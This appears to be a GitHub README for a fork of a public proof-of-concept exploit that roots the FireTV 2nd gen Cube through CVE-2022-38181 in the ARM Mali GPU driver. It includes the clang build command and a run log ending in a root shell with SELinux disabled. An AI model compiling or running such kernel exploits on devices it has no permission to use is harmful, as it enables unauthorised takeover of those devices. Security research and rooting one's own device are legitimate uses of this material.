## Exploit for CVE-2022-38181 for FireTV 2nd gen Cube

This is a fork of security researcher Man Yue Mo's <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2022_38181">Pixel 6 POC</a> for CVE_2022_38181.  Read his detailed write-up of the vulnerability <a href="https://github.blog/2023-01-23-pwning-the-all-google-phone-with-a-non-google-bug/">here</a>.  Changes have been made to account for FireOS's 32bit userspace, as well as the 2nd gen Cube's older Bifrost drivers (r16p0) and Linux kernel (4.9.113) versions. The POC exploits a bug in the ARM Mali kernel driver to gain arbitrary kernel code execution, which is then used to disable SELinux and gain root.  

I used the following command to compile with clang in ndk-21:
```
android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi30-clang -DSHELL mali_shrinker_mmap32.c -o raven_shrinker
```
The exploit should be run 30-90sec after the Cube boots for greatest reliability.
```
raven:/ $ /data/local/tmp/raven_shrinker<br>
fingerprint: Amazon/raven/raven:9/PS7624.3337N/0026810845440:user/amz-p,release-keys<br>
failed, retry.<br>
failed, retry.<br>
failed, retry.<br>
failed, retry.<br>
region freed 80<br>
alias gpu va 100c85000<br>
read 0<br>
cleanup flush region<br>
release_mem_pool<br>
jit_freed<br>
jit_free commit: 2 0<br>
Found freed_idx 2<br>
Found pgd 23, 100cce000<br>
overwrite addr : 104100634 634<br>
overwrite addr : 104300634 634<br>
overwrite addr : 1041001c4 1c4<br>
overwrite addr : 1043001c4 1c4<br>
result 50<br>
raven:/ # 
```
